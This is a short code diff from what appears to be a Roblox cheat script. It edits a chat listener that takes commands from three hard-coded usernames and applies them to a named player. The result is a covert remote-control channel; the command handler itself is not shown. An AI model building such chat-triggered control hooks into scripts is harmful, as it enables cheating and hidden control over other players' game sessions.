@@ -296,14 +296,14 @@ else
 
     getgenv().TextChatService = getgenv().Service_Wrap("TextChatService")
 
-    getgenv().TextChatService.MessageReceived:Connect(function(message)
+    getgenv().TextChatService.MessageReceived:Connect(function(message) 
         local sender = message.TextSource.Name
         local text = message.Text
-
+    
         if sender == "L0CKED_1N1" or sender == "Laylay_4kla" or sender == "CHEATING_B0SS" then
-            local command, playerName = string.match(text, "^(%?%w+)%s*(.*)")
-            if command then
-                handleCommand(command, playerName)
+            local prefix, command, playerName = string.match(text, "^(.)(%w+)%s*(.*)")
+            if prefix and command then
+                handleCommand(prefix .. command, playerName)
             else
                 warn("Invalid message format: " .. text)
             end
